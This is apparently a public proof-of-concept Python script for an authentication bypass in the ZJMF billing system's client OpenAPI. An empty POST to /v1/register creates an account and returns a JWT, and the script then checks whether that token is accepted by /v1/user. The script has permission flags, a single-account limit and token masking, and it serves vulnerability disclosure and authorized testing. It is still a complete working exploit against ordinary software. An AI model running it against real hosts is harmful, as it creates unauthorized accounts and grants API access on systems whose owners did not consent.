#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZJMF（智简魔方 / 魔方财务）客户区 OpenAPI /v1/register 空参数注册漏洞 PoC
——公开安全版。

本脚本只创建一个账号，并验证注册接口返回的 JWT 是否能通过 Check 中间件，
不提供批量注册，也不提供工单创建功能。

默认只做只读检查（GET /v1/register）。要创建账号，必须显式传入
--i-have-permission，确认你已获得目标系统的书面授权。

仅限授权安全测试使用。请勿对未授权的第三方系统运行。

用法：
    python3 poc.py --host https://your-zjmf-host --check
    python3 poc.py --host https://your-zjmf-host --i-have-permission
"""

import argparse
import base64
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0 Safari/537.36"
)


def normalize_host(host):
    """规范化 host：为空返回空；缺少协议时补 https://；去掉末尾斜杠。"""
    host = (host or "").strip()
    if not host:
        return ""
    if not host.startswith(("http://", "https://")):
        host = "https://" + host
    return host.rstrip("/")


def decode_json(raw):
    """尝试把响应体解析为 JSON，失败返回 None。"""
    if not raw:
        return None
    try:
        return json.loads(raw.decode("utf-8", "replace"))
    except ValueError:
        return None


def jwt_payload(jwt):
    """解析 JWT 的 payload，仅用于展示账号 id / username。"""
    try:
        part = jwt.split(".")[1]
        part += "=" * (-len(part) % 4)
        payload = base64.urlsafe_b64decode(part.encode())
        return json.loads(payload.decode("utf-8", "replace"))
    except Exception:
        return {}


class ZjmfClient(object):
    """极简 HTTP 客户端，仅使用 Python 标准库。"""

    def __init__(self, base, timeout=10.0, insecure=False):
        self.base = base
        self.timeout = timeout
        self.context = ssl.create_default_context()
        if insecure:
            self.context.check_hostname = False
            self.context.verify_mode = ssl.CERT_NONE

    def request(self, method, path, data=None, headers=None):
        url = self.base + path
        hdrs = {"User-Agent": DEFAULT_UA, "Accept": "application/json"}
        if headers:
            hdrs.update(headers)
        body = None
        if data is not None:
            body = urllib.parse.urlencode(data).encode()
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        kwargs = {"timeout": self.timeout}
        if url.startswith("https://"):
            kwargs["context"] = self.context
        try:
            with urllib.request.urlopen(req, **kwargs) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read()
        except Exception as exc:
            raise RuntimeError("%s %s 请求失败: %s" % (method, path, exc)) from exc

    def register_page(self):
        return self.request("GET", "/v1/register")

    def register_empty(self):
        # 空表单 body：不带 phone、email、password、captcha、code。
        return self.request("POST", "/v1/register", data={})

    def user_info(self, jwt):
        return self.request("GET", "/v1/user", headers={"Authorization": "JWT " + jwt})


def print_result(label, status, raw, verbose=False):
    """打印一次请求的结果，返回解析后的 JSON（如果有）。JWT 字段默认打码。"""
    obj = decode_json(raw)
    print("[%s] HTTP %s" % (label, status))
    if obj is not None:
        shown = obj
        if isinstance(obj, dict) and isinstance(obj.get("jwt"), str):
            shown = dict(obj)
            shown["jwt"] = shown["jwt"][:24] + "...<已打码>"
        text = json.dumps(shown, ensure_ascii=False)
        if len(text) > 500 and not verbose:
            text = text[:500] + " ..."
        print("  " + text)
    else:
        print("  " + raw[:500].decode("utf-8", "replace"))
    return obj


def main():
    parser = argparse.ArgumentParser(
        description="ZJMF /v1/register 空 body 未授权创建账号 PoC（公开安全版：单账号验证）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例：\n"
            "  python3 poc.py --host https://your-zjmf-host --check\n"
            "  python3 poc.py --host https://your-zjmf-host --i-have-permission\n"
        ),
    )
    parser.add_argument("--host", default="", help="目标地址，例如 https://your-zjmf-host（必填）")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP 超时秒数（默认 10）")
    parser.add_argument("--insecure", action="store_true", help="跳过 TLS 证书校验（自签名测试实例）")
    parser.add_argument("--check", action="store_true",
                        help="只请求 GET /v1/register，不创建账号（默认行为）")
    parser.add_argument("--i-have-permission", action="store_true",
                        help="确认已获得目标系统的书面授权后，才允许创建 1 个账号")
    parser.add_argument("--verbose", action="store_true", help="打印完整响应体（JWT 仍打码）")
    args = parser.parse_args()

    base = normalize_host(args.host)
    if not base:
        parser.error("--host 必填（默认为空）。示例：--host https://your-zjmf-host")

    if not args.check and not args.i_have_permission:
        print("[!] 已停止：创建账号需要显式确认授权。")
        print("[!] 如果这是你自己的测试实例，请追加 --i-have-permission。")
        print("[!] 仅限授权安全测试，请勿对未授权的第三方系统运行。")
        sys.exit(1)

    client = ZjmfClient(base, timeout=args.timeout, insecure=args.insecure)
    print("[*] 目标: %s" % base)

    # 先查看注册方式（只读）
    status, raw = client.register_page()
    obj = print_result("GET /v1/register", status, raw, args.verbose)
    if status == 200 and isinstance(obj, dict):
        data = obj.get("data") or {}
        if data.get("register_phone") and not data.get("register_email"):
            print("[*] 服务端声明的注册方式为仅手机注册；空 body 的 POST 仍可能绕过该限制。")

    if args.check:
        print("[*] 检查模式：未创建任何账号。")
        return

    print("")
    print("[*] 开始单账号验证（本脚本不会批量创建，也不会创建工单）。")
    status, raw = client.register_empty()
    obj = print_result("POST /v1/register（空 body）", status, raw, args.verbose)
    if status != 200 or not isinstance(obj, dict) or not obj.get("jwt"):
        print("[-] 注册未返回 JWT；目标可能不受影响，或前面有 WAF/验证码拦截。")
        return

    jwt = obj["jwt"]
    info = jwt_payload(jwt)
    userinfo = info.get("userinfo") or {}
    print("[+] 已获取 JWT，客户 id=%s username=%s" % (
        userinfo.get("id"), userinfo.get("username")))

    status, raw = client.user_info(jwt)
    obj2 = print_result("GET /v1/user（注册返回的 JWT）", status, raw, args.verbose)
    if status == 200 and isinstance(obj2, dict) and obj2.get("status") == 1001:
        print("[+] 结论：JWT 已通过 Check 中间件，匿名账号获得了 API 身份，漏洞存在。")
    else:
        print("[-] 结论：JWT 未被 /v1/user 接受，目标可能已修复或存在额外校验。")

    print("[*] 清理：请在后台或数据库中删除本次创建的空邮箱/空手机号客户。")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
    except RuntimeError as exc:
        print("[!] 请求失败：%s" % exc)
        sys.exit(1)
